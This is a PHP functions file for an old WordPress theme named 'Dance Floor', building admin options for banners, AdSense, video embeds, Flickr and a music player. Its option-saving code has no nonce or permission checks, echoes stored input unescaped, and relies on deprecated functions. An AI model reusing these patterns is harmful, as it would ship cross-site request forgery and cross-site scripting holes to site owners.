<?php
//Theme Name
$themename = "Dance Floor";
//prefix
$shortname = "theme_";

register_nav_menu( 'primary', 'Primary Menu' );

//Array
$options = array (
  array(
    "name" => "Videos urls",
    "id" => $shortname."_videosArray",
    "std" => "a:5:{s:10:\"url_video1\";a:3:{s:4:\"link\";s:1:\"#\";s:6:\"height\";i:250;s:5:\"width\";i:300;}s:10:\"url_video1\";a:3:{s:4:\"link\";s:1:\"#\";s:6:\"height\";i:250;s:5:\"width\";i:300;}s:10:\"url_video1\";a:3:{s:4:\"link\";s:1:\"#\";s:6:\"height\";i:250;s:5:\"width\";i:300;}s:10:\"url_video1\";a:3:{s:4:\"link\";s:1:\"#\";s:6:\"height\";i:250;s:5:\"width\";i:300;}s:10:\"url_video1\";a:3:{s:4:\"link\";s:1:\"#\";s:6:\"height\";i:250;s:5:\"width\";i:300;}}"),
  array(
    "name" => "Banners",
    "id" => $shortname."_bannersArray",
    "std" => "a:6:{s:13:\"theme_banner1\";a:5:{s:4:\"link\";s:1:\"#\";s:9:\"image_url\";s:0:\"\";s:6:\"height\";i:125;s:5:\"width\";i:125;s:6:\"status\";i:0;}s:13:\"theme_banner2\";a:5:{s:4:\"link\";s:1:\"#\";s:9:\"image_url\";s:0:\"\";s:6:\"height\";i:125;s:5:\"width\";i:125;s:6:\"status\";i:0;}s:13:\"theme_banner3\";a:5:{s:4:\"link\";s:1:\"#\";s:9:\"image_url\";s:0:\"\";s:6:\"height\";i:125;s:5:\"width\";i:125;s:6:\"status\";i:0;}s:13:\"theme_banner4\";a:5:{s:4:\"link\";s:1:\"#\";s:9:\"image_url\";s:0:\"\";s:6:\"height\";i:125;s:5:\"width\";i:125;s:6:\"status\";i:0;}s:13:\"theme_banner5\";a:6:{s:4:\"link\";s:1:\"#\";s:9:\"image_url\";s:0:\"\";s:6:\"height\";i:250;s:5:\"width\";i:300;s:6:\"status\";i:0;s:7:\"adsense\";s:0:\"\";}s:13:\"theme_banner6\";a:6:{s:4:\"link\";s:1:\"#\";s:9:\"image_url\";s:0:\"\";s:6:\"height\";i:60;s:5:\"width\";i:468;s:6:\"status\";i:0;s:7:\"adsense\";s:0:\"\";}}"
  ),
  array(
    "name" => "Styles",
    "id" => $shortname."_css",
    "std" => "style.css"
  ),
  array(
    "name" => "flickr",
    "id" => $shortname."_flickr",
    "std" => "a:4:{s:4:\"nsid\";s:0:\"\";s:7:\"display\";s:0:\"\";s:11:\"displayType\";s:0:\"\";s:4:\"tags\";s:0:\"\";}"
  ),
  array(
    "name" => "musicplayer",
    "id" => $shortname."_musicplayer",
    "std" => "a:2:{s:2:\"id\";s:0:\"\";s:3:\"num\";s:1:\"5\";}"
  ),
  array(
  	"name" => "FeedbSumition",
  	"id" => $shortname."_musicplayerSumition",
  	"std" => ""
  ),
    array(
  	"name" => "html5",
  	"id" => $shortname."_html5",
  	"std" => ""
  ),
  array(
  	"name" => "BannersStatus",
  	"id" => $shortname."_bannerStatus",
  	"std" => "1"
  ),
);
//Flickr display types
$flickrDisplayType = Array("square", "thumbnail", "small");

//Existing CSS Files
$cssFiles = get_availableCss();

function get_bannersSettings($bannerId, $index = FALSE){
  global $themename, $shortname, $options;
 $theBanners = get_option($shortname."_bannersArray");
  if(!is_array($theBanners)){
  	$theBanners = unserialize($options[1]["std"]);
  }
  $theActualBanner = $theBanners[$bannerId];
  if($index != FALSE){
  	return $theActualBanner[$index];
  }else{
  	return $theActualBanner;
  }
}

function get_videoSettings($videoId, $index){
  global $themename, $shortname, $options;
  $theVideos = get_option($shortname."_videosArray");
  if(!is_array($theVideos)){
		$theVideos = unserialize($options[0]["std"]);
  }
  $theActualVideo = $theVideos[$videoId];
  return $theActualVideo[$index];
}

function get_flickrSettings($index){
	global $themename, $shortname, $options;
	$theflickrSettings = get_option($shortname."_flickr");
		if(!is_array($theflickrSettings)){
		$theflickrSettings = unserialize($options[3]["std"]);
  }
  return $theflickrSettings[$index];
}

function get_musicplayer($index){
	global $themename, $shortname, $options;
	$themusicplayerSettings = get_option($shortname."_musicplayer");
	if(!is_array($themusicplayerSettings)){
		$themusicplayerSettings = unserialize($options[4]["std"]);
	}
	return $themusicplayerSettings[$index];
}
/*
Get Available CSS
*/
function get_availableCss(){
  $result = array();
  $dir = dir(TEMPLATEPATH."/");
  while (false !== ($file = $dir->read())) {
    if(ereg("\.css", $file, $r)){
    	$result[] = $file;
    }
  }
  $dir->close();
  return $result;
}
/*
Reset or Update Theme Options
*/
function newThemeOptions_add_admin() {
  global $themename, $shortname, $options, $cssFiles;
  if ( $_GET['page'] == basename(__FILE__) ) {
    if($_REQUEST['saveButton']){
			while(list($videoId, $bannerInfo) = each($_REQUEST[$shortname."_video"])){
        $videoInfo["width"] = get_videoSettings($videoId, "width");
        $videoInfo["height"] = get_videoSettings($videoId, "height");
        $videoInfo["link"] = $_REQUEST[$shortname."_video"][$videoId]["link"];
        $allVideos[$videoId] = $bannerInfo;
      }
      update_option( $shortname."_videosArray", $allVideos);

      update_option( $shortname."_css", $_REQUEST[ $shortname."_css" ] );
      while(list($bannerId, $bannerInfo) = each($_REQUEST[$shortname."_banner"])){
        $bannerInfo["width"] = get_bannersSettings($bannerId, "width");
        $bannerInfo["height"] = get_bannersSettings($bannerId, "height");
        $bannerInfo["status"] = $_REQUEST[$shortname."_banner"][$bannerId]["status"];
        if($_REQUEST[$shortname."_banner"][$bannerId]["adsense"])
        	$bannerInfo["adsense"] = ($_REQUEST[$shortname."_banner"][$bannerId]["adsense"]);
        $allBanners[$bannerId] = $bannerInfo;
      }
      update_option( $shortname."_bannersArray", $allBanners);
      update_option( $shortname."_flickr", $_REQUEST[$shortname."_flickr"]);
      update_option( $shortname."_musicplayer", $_REQUEST[$shortname."_musicplayer"]);
      update_option( $shortname."_musicplayerSumition", $_REQUEST[$shortname."_musicplayerSumition"]);
      update_option( $shortname."_html5", $_REQUEST[$shortname."_html5"]);
      update_option( $shortname."_bannerStatus", $_REQUEST[$shortname."_bannerStatus"]);
      header("Location: themes.php?page=functions.php&saved=true");
      die;
  	}else if($_REQUEST['resetButton']){
      foreach ($options as $value) {
      	delete_option( $value['id'] ); }
      header("Location: themes.php?page=functions.php&reset=true");
      die;
    }
  }
  //add_theme_page($themename." Options", "Theme Options", 'edit_themes', basename(__FILE__), 'newThemeOptions_admin');
}
function newThemeOptions_admin() {
  global $themename, $shortname, $options, $cssFiles, $flickrDisplayType;
  if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
  if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
	echo "\n<style type='text/css'>";
	echo "\ndiv.wrap dl{margin: 0; padding: 0;}";
	echo "\ndiv.wrap dt{position: relative; left: 0; top: 1.1em; width: 8em; font-weight: bold;}";
	echo "\ndiv.wrap dd{ margin: 0 0 0 10em; padding: 0 0 .5em .5em;}";
	echo "\table#outer dl h3, table#outer td.right dl h4 { font-size: 10pt; font-weight: bold; margin:0; padding: 4px 10px 4px 10px; }";
	echo "\n</style>";
	echo "\n<script>";
	echo "\n\tfunction markAll(selectStatus){";
	echo "\n\t\tif(selectStatus){";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner1][status]').checked = true;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner2][status]').checked = true;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner3][status]').checked = true;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner4][status]').checked = true;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner5][status]').checked = true;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner6][status]').checked = true;";
	echo "\n\t\t}else{";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner1][status]').checked = false;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner2][status]').checked = false;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner3][status]').checked = false;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner4][status]').checked = false;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner5][status]').checked = false;";
	echo "\n\t\t\tdocument.getElementById('theme__banner[theme_banner6][status]').checked = false;";
	echo "\n\t\t}";
	echo "\n\t}";
	echo "\n</script>";
	echo "\n<div class=\"wrap\">";
  	echo "\n<p id=\"icon-options-general\" class=\"icon32\"><h2>".$themename." "?><?php _e("theme settings","language");?><? "</h2></p><br/>";
 	echo "\n<form method=\"post\">";
  	echo "\n<p class=\"submit\" style=\"border:0px;padding:0px;\">";
 	echo "\n\t<input  class=\"button-primary\" type=\"submit\" name=\"saveButton\" value=\""?><?php _e("Save settings","language");?><? echo "\" />";
 	echo "\n\t<input class=\"button\" name=\"resetButton\" type=\"submit\" value=\""?><?php _e("Reset settings","language");?><? echo "\" /><br/>";
  	echo "\n</p>";
    echo "\n<br><table class=\"widefat\"><thead><tr><th style='font-size:14px;font-weight:normal;font-style:normal;padding-left:10px;'>" ?><?php _e("Theme Style","language");?><? "</th></tr></thead>";
  	echo "\n\t\t<tbody><tr><th >"?><?php _e("Select your Style","language");?><? "";
  	echo "\n\t\t\t<select name=\"".$shortname."_css\" id=\"".$shortname."_css\">";while(list(, $f) = each($cssFiles)){
  	echo "\n\t\t\t\t<option value=\"".$f."\" ".((get_option( $shortname."_css" )==$f)?"selected":"").">".$f."</option>";}
  	echo "\n\t\t\t</select>";
	echo "\n</td></th></tr></tbody></table>";
  	echo "\n<table class=\"form-table\">";
  	echo "\n\t<tr valign=\"top\">";
  	echo "\n\t\t<br><table class=\"widefat\"><thead><tr><th>" ?><?php _e("Flickr Widget Setup","language");?><? "</th></tr></thead>";
  	echo "\n\t\t<tbody><tr><th>";
  	echo "\n<table class=\"form-table\">";
  	echo "\n\t<tr valign=\"top\">";
  	echo "\n\t\t<th scope=\"row\">User ID: </th>";
  	echo "\n\t\t<td>";
  	echo "\n\t\t\t<input name=\"".$shortname."_flickr[nsid]\" type=\"text\" id=\"".$shortname."_flickr[nsid]\" value=\"".get_flickrSettings('nsid')."\" size=\"20\" />";
  	echo "\n\t\t</td>";
	echo "\n\t</tr>";
  	echo "\n\t\t<th>Display: </th>";
  	echo "\n\t\t<td>";
  	echo "\n\t\t\t<select name=\"".$shortname."_flickr[display]\" id=\"".$shortname."_flickr[display]\">";
  	for($x = 1; $x<= 10; $x++){
  	echo "\n\t\t\t\t<option value=\"".$x."\" ".((get_flickrSettings( "display" )==$x)?"selected":"").">".$x."</option>";
 	 }
 	echo "\n\t\t\t</select>";
  	echo "\n\t\t\t<select name=\"".$shortname."_flickr[displayType]\" id=\"".$shortname."_flickr[displayType]\">";
  	while(list(, $f) = each($flickrDisplayType)){
	echo "\n\t\t\t\t<option value=\"".$f."\" ".((get_flickrSettings( "displayType" )==$f)?"selected":"").">".$f."</option>";
  	}
  	echo "\n\t\t\t</select> Images  ";
  	echo "\n\t\t</td>";
	echo "\n\t</tr>";
  	echo "\n</td></th></tr></tbody></table></table>";
    echo "\n\t\t<br><table class=\"widefat\"><thead><tr><th>" ?><?php _e("Music Player","language");?><? "</th></tr></thead>";
  	echo "\n\t\t<tbody><tr><th>";
  	echo "\n<table class=\"form-table\">";
  	echo "\n\t<tr valign=\"top\">";
  	echo "\n\t\t<th scope=\"row\">" ?><?php _e("Enter your the URl of your song.","language");?><? "</th>";
  	echo "\n\t\t<td>";
  	echo "\n\t\t\t<input name=\"".$shortname."_musicplayerSumition\" type=\"text\" id=\"".$shortname."_musicplayerSumition\" value=\"".get_option($shortname.'_musicplayerSumition')."\" size=\"100\" />";
  	echo "\n\t\t</td>";
	echo "\n\t</tr>";
  	echo "\n</td></th></tr></tbody></table></table>";
    echo "\n\t\t<br><table class=\"widefat\"><thead><tr><th>" ?><?php _e("Audio/Video Player Module","language");?><? "</th></tr></thead>";
	echo "\n\t\t<tbody><tr><th>";
  	echo "\n<table class=\"form-table\">";
  $videosArray = unserialize($options[0]["std"]);
  $x = 1;
  $bg = 'style="background: #f1f1f1;"';
  while(list($videoIndex, $aVideo) = each($videosArray)){
		$bg = ($bg == 'style="background: #f1f1f1;"') ? '' : 'style="background: #f1f1f1;"';
    echo "\n\t<tr valign=\"top\" ".$bg.">";
    echo "\n\t\t<td ".$bg.">";
    echo "\n\t\t<dl>";
    echo "\n\t\t\t<dt>" ?><?php _e("Player Code","language");?><? "</dt>";
	echo "\n\t\t\t<dd><textarea name=\"".$shortname."_video[".$videoIndex."][link]\" id=\"".$shortname."_video[".$videoIndex."][link]\" style=\"width: 550px; height: 120px;\">".stripslashes((get_videoSettings($videoIndex, "link")!="")?get_videoSettings($videoIndex, "link"):$aVideo[$videoIndex]["link"])."</textarea><br />" ?><?php _e("Paste code for audio/video player","language");?><? "<dd>";
    echo "\n\t\t\t<input name=\"".$shortname."_video[".$videoIndex."][width]\" id=\"".$shortname."_video[".$videoIndex."][width]\" type=\"hidden\" value=\"".( (get_videoSettings($videoIndex, "width")!="")?get_videoSettings($videoIndex, "width"):$aVideo[$videoIndex]["width"])."\"  />";
    echo "\n\t\t\t<input name=\"".$shortname."_video[".$videoIndex."][height]\" id=\"".$shortname."_video[".$videoIndex."][height]\" type=\"hidden\" value=\"".( (get_videoSettings($videoIndex, "height")!="")?get_videoSettings($videoIndex, "height"):$aVideo[$videoIndex]["height"])."\"/>";
    echo "\n\t\t</td>";
    echo "\n\t</tr>";
  }
    echo "\n</table>";
    echo "\n</td></th></tr></tbody></table></table>";
 	echo "\n  <span style='font-size:14px;font-weight:normal;font-style:normal;padding-left:10px;'>"?><?php _e("Advertisement Banner Management", "language")?><? echo "</span>";
   	echo "\n\t\t<tbody><tr><th>";
    echo "\n<table class=\"form-table\">";
    echo "\n\t<tr valign=\"top\">";
    echo "\n\t\t<th scope=\"row\">Status: </th>";
  $bannersArray = unserialize($options[1]["std"]);
	$c = 0;
    echo "\n\t\t<td><input type=\"checkbox\" name=\"".$shortname."_bannerStatus\" id=\"".$shortname."_bannerStatus\" value=\"1\" ".((get_option($shortname.'_bannerStatus')==1)?"checked":"")." onClick=\"javascript: markAll(this.checked);\"> Enable All Banners</td>";
 	echo "\n\t</tr>";
    echo "\n</table>";
    echo "\n<div id=\"diFortable\">";
    echo "\n<table class=\"form-table\">";
  $x = 1;
  $bg = '';
  while(list($bannerIndex, $aBanner) = each($bannersArray)){
		$bg = ($bg == 'style="background: #f1f1f1;"') ? '' : 'style="background: #f1f1f1;"';
		$bannerName = ereg_replace("[0-9]{1}", "  #".$x++, str_replace($shortname,"", $bannerIndex));
    echo "\n\t<tr valign=\"top\">";
    echo "\n\t\t<th scope=\"row\" ".(($bg) ? $bg : "style=\"width: 100px;\"").">".$bannerName." <br/>(size:  ".get_bannersSettings($bannerIndex, "width")."x".get_bannersSettings($bannerIndex, "height")."):</th>";
    echo "\n\t\t<td ".$bg.">";
    echo "\n\t\t<dl>";
    echo "\n\t\t\t<dt>"?><?php _e("Image: ", "language")?><? echo "</dt>";
        echo "\n\t\t\t<dd><input style=\"width: 450px;padding:5px;margin:0;\" name=\"".$shortname."_banner[".$bannerIndex."][image_url]\" id=\"".$shortname."_banner[".$bannerIndex."][image_url]\" type=\"text\" value=\"".( (get_bannersSettings($bannerIndex, "image_url")!="")?get_bannersSettings($bannerIndex, "image_url"):$aBanner[$bannerIndex]["image_url"])."\" /><br />"?><?php _e("Enter the URL Path for this Banner Image.", "language")?><? echo "<dd>";    echo "\n\t\t\t<dt>Url:</dt>";
    echo "\n\t\t\t<dd><input  style=\"width: 450px;\" name=\"".$shortname."_banner[".$bannerIndex."][link]\" id=\"".$shortname."_banner[".$bannerIndex."][link]\" type=\"text\" value=\"".( (get_bannersSettings($bannerIndex, "link")!="")?get_bannersSettings($bannerIndex, "link"):$aBanner[$bannerIndex]["link"])."\" /><br />"?><?php _e("Enter the URL Link where this Banner Links To.", "language")?><? echo "<dd>";    echo "\n\t\t\t<dt>Url:</dt>";    $bannerAux = get_bannersSettings($bannerIndex);
    if(isset($bannerAux["adsense"])){
		   echo "\n\t\t\t<dt>"?><?php _e("Google Adsense code: ", "language")?><? echo "</dt>";
		  echo "\n\t\t\t<dd><textarea name=\"".$shortname."_banner[".$bannerIndex."][adsense]\" id=\"".$shortname."_banner[".$bannerIndex."][adsense]\" style=\"width: 550px; height: 120px;\">".stripslashes((get_bannersSettings($bannerIndex, "adsense")!="")?get_bannersSettings($bannerIndex, "adsense"):$aBanner[$bannerIndex]["adsense"])."</textarea><br />"?><?php _e("If Adsense Publisher Code is Present, it will show as default banner. ", "language")?><? echo "<dd>";
    }
    echo "\n\t\t\t<dt>"?><?php _e("Status: ", "language")?><? echo "</dt>";
    echo "\n\t\t\t<dd><input type=\"checkbox\" name=\"".$shortname."_banner[".$bannerIndex."][status]\" id=\"".$shortname."_banner[".$bannerIndex."][status]\" value=\"1\" ".( (get_bannersSettings($bannerIndex, "status") == 1) ? "checked" : "").">"?><?php _e(" Enabled", "language")?><? echo "<dd>";
    echo "\n\t\t</td>";
    echo "\n\t</tr>";
  }
  echo "\n</td></th></tr></tbody></table></table>";
  if(get_option($shortname.'_bannerStatus') == 1){
  	echo "\n<script>markAll(1);</script>";
  }
  echo "\n</div>";
  echo "\n<p class=\"submit\">";
 	echo "\n\t<input  class=\"button-primary\" type=\"submit\" name=\"saveButton\" value=\""?><?php _e("Save settings","language");?><? echo "\" />";
 	echo "\n\t<input class=\"button\" name=\"resetButton\" type=\"submit\" value=\""?><?php _e("Reset settings","language");?><? echo "\" />";
  echo "\n</p>";
  echo "\n</form>";

}
/*
Add CSS Style to Header
*/
function newThemeOptions_wp_head() {
	global $shortname; ?>

	<link type="text/css" href="<?php echo get_template_directory_uri(); ?>/style.css" rel="stylesheet">
	<?php
}

function newThemeOptions_showBannersSquare(){
	global $themename, $shortname, $options, $cssFiles;
	if(get_bannersSettings("theme_banner1", "status") OR get_bannersSettings("theme_banner2", "status") OR get_bannersSettings("theme_banner3", "status") OR get_bannersSettings("theme_banner4", "status")){
		echo "\n<div class=\"adSpacetop\"></div>";
		echo "\n<div class=\"sidebarLiContent\">";
		echo "\n<div id=\"bannersSquare\">";
		echo "\n\t";
		if((get_bannersSettings("theme_banner1", "image_url")!="") AND (get_bannersSettings("theme_banner1", "status")==1)){
			echo "\n\t\t<a href=\"".get_bannersSettings("theme_banner1", "link")."\" title=\"\"><img src=\"".get_bannersSettings("theme_banner1", "image_url")."\" alt=\"\"/></a>";
		}
		if((get_bannersSettings("theme_banner2", "image_url")!="") AND (get_bannersSettings("theme_banner2", "status")==1)){
			echo "\n\t\t<a href=\"".get_bannersSettings("theme_banner2", "link")."\" title=\"\"><img src=\"".get_bannersSettings("theme_banner2", "image_url")."\" alt=\"\"/></a>";
		}
		if((get_bannersSettings("theme_banner3", "image_url")!="") AND (get_bannersSettings("theme_banner3", "status")==1)){
			echo "\n\t\t<a href=\"".get_bannersSettings("theme_banner3", "link")."\" title=\"\"><img src=\"".get_bannersSettings("theme_banner3", "image_url")."\" alt=\"\"/></a>";
		}
		if((get_bannersSettings("theme_banner4", "image_url")!="") AND (get_bannersSettings("theme_banner4", "status")==1)){
			echo "\n\t\t<a href=\"".get_bannersSettings("theme_banner4", "link")."\" title=\"\"><img src=\"".get_bannersSettings("theme_banner4", "image_url")."\" alt=\"\"/></a>";
		}
		echo "\n\t";
		echo "\n</div>\n";
		echo "\n</div>\n";
		echo "\n<div class=\"adSpacebot\"></div>";

	}
}
function re_layout_setup() { ?>
	<div class="wrap">
	<h2>Dance Floor Page Layout</h2>
	<form method="post" action="options.php">
	<?php wp_nonce_field('update-options'); ?>
	 <table class="widefat"><thead><tr><th>
	<?php _e("Page Setup","language");?></th></tr></thead>
  	<tbody><tr><th><div style="width:500px;padding-top:20px;">Please select your Dance Floor theme layout:
  	<select name="layout">
  	<option value="left_sidebar" <?php echo (get_option('layout')=='left_sidebar' ? 'selected' : '') ?>>Left Sidebar Layout</option>
	<option value="right_sidebar" <?php echo (get_option('layout')=='right_sidebar' ? 'selected' : '') ?>>Right Sidebar Layout</option>
	</select>
	<input type="hidden" name="action" value="update" />
	<input type="hidden" name="page_options" value="layout" />
	<p class="submit">
	<input type="submit"  class="button-primary" style="padding:2px 5px 3px 5px" name="Submit" value="<?php _e('Save Changes', 'language') ?>" />
	</p>
	<div style="float:left;width:600px;">
	<p style="float:left;width:260px">&nbsp;&nbsp;&nbsp;Left Sidebar Layout<br/><img src="<?php bloginfo('template_directory'); ?>/images/LeftSidebar.jpg" alt="LeftSidebar" width="233" height="346" /></p>	<p>&nbsp;&nbsp;&nbsp;Right Sidebar Layout<br/><img src="<?php bloginfo('template_directory'); ?>/images/RightSidebar.jpg"  width="233" height="346" /></p>
</div></select>
	</td></th></tr></tbody></table>
	</form>
	</div>
	<?php
}
get_option('layout')=='left_sidebar';
function layout_setup() {

	add_theme_page('Theme Layout', 'Theme Layout', 3, 'layout', 're_layout_setup');
}

add_option( 'layout', 'right_sidebar' );
add_action( 'admin_menu', 'layout_setup' );
/*
Show Header Banner
*/
function FooterBanner(){
	global $themename, $shortname, $options, $cssFiles;
	if(get_bannersSettings("theme_banner6", "status")==1){
		if(get_bannersSettings("theme_banner6", "adsense")!=""){
			echo stripslashes(get_bannersSettings("theme_banner6", "adsense"))."\n";
		}else if(get_bannersSettings("theme_banner6", "image_url")!=""){
			echo "<a href=\"".get_bannersSettings("theme_banner6", "link")."\" title=\"\"><img src=\"".get_bannersSettings("theme_banner6", "image_url")."\" alt=\"\" /></a>\n";
		}
	}
}
add_filter('widget_text', 'do_shortcode');
/*
Show Random Videos
*/
function newThemeOptions_showPlayer(){
	global $themename, $shortname, $options, $cssFiles;
	$c = 0;
	$search = TRUE;
	srand((float) microtime() * 10000000);
	$theVideos = get_option($shortname."_videosArray");
  if(!is_array($theVideos)){
		$theVideos = unserialize($options[0]["std"]);
  }
	srand((float)microtime() * 1000000);
	shuffle($theVideos);
	while(($c <= 4)AND($search)){
		if(preg_match("#param(.+?)movie(.+?)>#is", stripslashes($theVideos[$c]["link"]), $r)){
			if(preg_match("#([a-zA-Z]+[:\/\/]+[A-Za-z0-9\-_]+\\.+[A-Za-z0-9\.\/%&=\?\-_]+)#is", $r[0], $r)){
				$theUrl = $r[1];
				$theWidth = 324;
				$theheight = 264;
				$search = FALSE;
			}
		}
		$c++;
	}
if($theUrl==""){
		echo stripslashes(get_videoSettings("url_video1", "link"))."\n";
	}
}

/*
Show Random Videos
*/
function show_player(){

		echo stripslashes(get_videoSettings("url_video1", "link"))."\n";	}

/*
Show 300x250 Banner
*/
function newThemeOptions_showBigBanner(){
	global $themename, $shortname, $options, $cssFiles;
	if(get_bannersSettings("theme_banner5", "status")==1){
		if(get_bannersSettings("theme_banner5", "adsense")!=""){
			echo "\n<div class=\"ad300x250\">";
			echo stripslashes(get_bannersSettings("theme_banner5", "adsense"))."\n";
			echo "\n</div>\n";
		}else if(get_bannersSettings("theme_banner5", "image_url")!=""){
			echo "<a href=\"".get_bannersSettings("theme_banner5", "link")."\" title=\"\"><img src=\"".get_bannersSettings("theme_banner5", "image_url")."\" alt=\"\"/></a>\n";
		}
	}
}
/*
Get flickr info
get_flickrRSS is adapted from http://eightface.com/wordpress/flickrrss/
*/
function get_flickrFeed() {
	$userid = stripslashes(get_flickrSettings('nsid'));
	if($userid){
		$num_items = get_flickrSettings('display');
		$tags = trim(get_flickrSettings('tags'));;
		$imagesize = get_flickrSettings('displayType');
		if (!function_exists('MagpieRSS')) {
			include_once (ABSPATH . WPINC . '/rss.php');
			error_reporting(E_ERROR);
		}
		$rss_url = 'http://api.flickr.com/services/feeds/photos_public.gne?id=' . $userid . '&tags=' . $tags . '&format=rss_200';
		$rss = @ fetch_rss($rss_url);
		if ($rss) {
			$imgurl = "";
			$items = array_slice($rss->items, 0, $num_items);

			foreach ( $items as $item ) {
				if(preg_match('<img src="([^"]*)" [^/]*/>', $item['description'],$imgUrlMatches)) {
					$imgurl = $imgUrlMatches[1];
					$imgurlink = $imgUrlMatches[1];
					if ($imagesize == "square") {
						$imgurl = str_replace("m.jpg", "s.jpg", $imgurl);
						$imgurlink = str_replace("m.jpg", "b.jpg", $imgurlink);
					} elseif ($imagesize == "thumbnail") {
						$imgurlink = str_replace("m.jpg", "b.jpg", $imgurl);
					}
					$title = htmlspecialchars(stripslashes($item['title']));
					$url = $item['link'];
					preg_match('<http://farm[0-12]{0,3}\.static.flickr\.com/\d+?\/([^.]*)\.jpg>', $imgurl, $flickrSlugMatches);
					$flickrSlug = $flickrSlugMatches[1];
					echo "\n<a rel=\"lightbox\" href=\"".$imgurlink."\" \ title=\"".$title."\"><img src=\"".$imgurl."\" alt=\"".$title."\" /></a>";
				}
			}

		} else {
			echo "Flickr";
		}
	}
}
function get_musicplayerSumitionForm(){
	global $shortname;
	$musicplayerId = get_option($shortname.'_musicplayerSumition');
	if($musicplayerId != ""){
				echo do_shortcode('[audio src="'.$musicplayerId.'" preload=true autoplay=false ]');

	}
}
function search_thumb($post_id, $size)
	{
		global $wpdb;
				$querystr = " SELECT
								ID AS 'ID',
								post_excerpt AS 'imageTitle',
								guid AS 'imageGuid'
					  FROM
								" . $wpdb->prefix . "posts
					  WHERE
									" . $wpdb->prefix . "posts.post_parent = ". $post_id . "
								AND	" . $wpdb->prefix . "posts.post_type = \"attachment\"
					  ORDER BY
								" . $wpdb->prefix . "posts.menu_order ASC
					  					  LIMIT 1";
		$pageposts = $wpdb->get_row($querystr);
		$attachment_size=wp_get_attachment_image_src($pageposts->ID, $size);
		$link= get_permalink();
		$blog = get_bloginfo('template_url');
		if ($pageposts)
		{
			return "<a href=".$link."><img src='".$attachment_size[0]."' rel=shadowbox  /></a>";
		}
		else
			return;
	}
register_sidebar_widget(__('Flickr','language'), 'flickr_widget');
$wp_registered_widgets[sanitize_title('Flickr')]['description'] = 'Display a Flickr photostream in your sidebar. Add your Flickr ID in Theme Options.';
function flickr_widget($args) {
 extract($args);
 echo $before_widget;
 echo '<div class="flickr">';
		get_flickrFeed();
 echo '</div>';
 echo $after_widget;
}
register_sidebar_widget(__('Music Player','language'), 'musicplayer_widget');
$wp_registered_widgets[sanitize_title('Music Player')]['description'] = 'Add your own song  with the Music Player widget.';

function musicplayer_widget($args) {
 extract($args);
 echo $before_widget;
 echo $before_title . '' . $after_title;

	echo	get_musicplayerSumitionForm();
 echo $after_widget;
}

register_sidebar_widget(__('Twitter','language'), 'twitter_widget');
$wp_registered_widgets[sanitize_title('Twitter')]['description'] = 'Twitter stream in your sidebar, add your Twitter username in your User Profile and place this widget in your Sidebar or Footer to show the stream.';

function twitter_widget($args) {
 extract($args);
 echo $before_widget;
 echo $before_title . __('Twitter','language') . $after_title;
		include(TEMPLATEPATH . '/twitter.php');
 echo $after_widget;
}

register_sidebar_widget(__('Facebook','language'), 'facebook_widget');
$wp_registered_widgets[sanitize_title('Facebook')]['description'] = 'Facebook "Like" Boxes in your sidebar, add your Facebook URl in your User Profile and place this widget in your Sidebar or Footer to show the box.';

function facebook_widget($args) {
 extract($args);
 echo $before_widget;
 echo $before_title . __('Facebook','language') . $after_title;
 include(TEMPLATEPATH . '/facebook.php');
 echo $after_widget;
}

add_action('admin_menu', 'newThemeOptions_add_admin');
function DanceFloor_wdg() {
		register_sidebar( array(
		'name' => __( 'Sidebar Widgets', 'language' ),
		'id' => 'primary-widget-area',
		'description' => __( 'The primary widget area', 'language' ),
		'before_widget' => '<ul><li><div class="adSpacetop"></div>
<div class="sidebarLiContent">
<div class="WidgetContent">
',
        'after_widget' => '</div></div><div class="adSpacebot"></div></li></ul>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
	) );
	register_sidebar( array(
		'name' => __( 'Photo Gallery', 'language' ),
		'id' => 'gallery-widget-area',
		'description' => __( 'The center widget area', 'language' ),
		'before_widget' => '<div class="flickrbox"><ul><li>',
        'after_widget' => '</li></ul></div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
	) );
		register_sidebar( array(
		'name' => __( 'Music Player', 'language' ),
		'id' => 'player-widget-area',
		'description' => __( 'Music Player Widget', 'language' ),
		'before_widget' => '',
        'after_widget' => '',
        'before_title' => '',
        'after_title' => '',
	) );
	register_sidebar( array(
		'name' => __( 'Widgets Home', 'language' ),
		'id' => 'calendar-widget-area',
		'description' => __( 'The home calendar widget area', 'language' ),
		'before_widget' => '<div class="homewbox"><div class="homewtop"></div><div class="homewmiddle">	',
        'after_widget' => '</div><div class="homewbottom"></div></div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
	) );
}
add_action( 'widgets_init', 'DanceFloor_wdg' );
add_action( 'after_setup_theme', 'language_setup' );
if ( ! function_exists('language_setup') ):
function language_setup() {
	add_theme_support( 'post-thumbnails');
	set_post_thumbnail_size(300, 200, true);
	add_image_size('eventthumb', 160, 144, true);
	add_image_size('internal', 500, 444, true);
	add_custom_background();
	add_theme_support( 'nav-menus' );
	add_theme_support( 'automatic-feed-links' );
	define( 'HEADER_TEXTCOLOR', '' );
	define( 'HEADER_IMAGE', '%s/images/logo.png' );
	define( 'HEADER_IMAGE_WIDTH', apply_filters( 'home_header_image_width', 960 ) );
	define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'home_header_image_height',121 ) );
	define( 'NO_HEADER_TEXT', true );
	add_custom_image_header( '', 'home_header' );
}
endif;
if ( ! function_exists( 'home_header' ) ) :
function home_header() {
?>
<style type="text/css">
#headimg {
	height: <?php echo logo_height; ?>px;
	width: <?php echo logo_width; ?>px;
}
#headimg h1, #headimg #desc {
	display: none;
}
</style>
<?php
}
endif;
load_theme_textdomain( 'language', TEMPLATEPATH.'/languages/' );
